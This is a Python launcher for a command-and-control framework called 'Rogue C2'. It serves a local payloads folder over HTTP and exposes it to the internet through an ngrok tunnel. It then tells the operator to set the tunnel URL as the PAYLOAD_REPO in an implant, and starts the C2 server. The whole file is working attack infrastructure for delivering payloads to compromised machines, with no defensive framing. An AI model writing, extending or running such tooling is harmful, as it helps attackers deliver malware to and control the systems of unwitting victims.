#!/usr/bin/env python3
import subprocess
import time
import os
import requests
import threading

NGROK_AUTH_TOKEN = "your-ngrok-auth-token"  #  Replace with your real token
PAYLOAD_PORT = 8000
NGROK_API = "http://127.0.0.1:4040/api/tunnels"
C2_FILE = os.path.abspath("rogue_c2.py") 

def install_ngrok_token():
    print("[*] Setting ngrok auth token...")
    try:
        subprocess.run(["ngrok", "config", "add-authtoken", NGROK_AUTH_TOKEN], check=True)
    except subprocess.CalledProcessError:
        print("[!] Error: Could not set ngrok auth token. Make sure ngrok is installed.")
        exit(1)

def start_payload_server():
    payload_path = os.path.join(os.getcwd(), "payloads")
    if not os.path.exists(payload_path):
        print("[!] 'payloads/' folder not found.")
        return
    os.chdir(payload_path)
    subprocess.Popen(["python3", "-m", "http.server", str(PAYLOAD_PORT)], stdout=subprocess.DEVNULL)
    print(f"[+] Payload HTTP server running on port {PAYLOAD_PORT}")

def start_ngrok():
    subprocess.Popen(["ngrok", "http", str(PAYLOAD_PORT)], stdout=subprocess.DEVNULL)
    time.sleep(5)
    try:
        response = requests.get(NGROK_API).json()
        tunnels = response.get("tunnels", [])
        for t in tunnels:
            if t["proto"] == "https":
                return t["public_url"]
    except Exception as e:
        print(f"[!] Error retrieving ngrok tunnel: {e}")
    return None

def start_rogue_c2():
    if not os.path.isfile(C2_FILE):
        print(f"[!] Could not find rogue_c2.py at {C2_FILE}")
        return
    print("[*] Launching Rogue C2...")
    subprocess.run(["python3", C2_FILE])

def main():
    if NGROK_AUTH_TOKEN == "your-ngrok-auth-token":
        print("[!] Please replace NGROK_AUTH_TOKEN with your actual token.")
        return

    install_ngrok_token()

    print("[*] Starting payload HTTP server...")
    threading.Thread(target=start_payload_server, daemon=True).start()

    print("[*] Launching ngrok tunnel...")
    public_url = start_ngrok()

    if public_url:
        print(f"\n[NGROK] HTTPS Tunnel Ready: {public_url}")
        print(f"[→] Set this in your implant as:\n\n    PAYLOAD_REPO = \"{public_url}/\"\n")
    else:
        print("[!] Failed to retrieve ngrok tunnel.")

    start_rogue_c2()

if __name__ == "__main__":
    main()
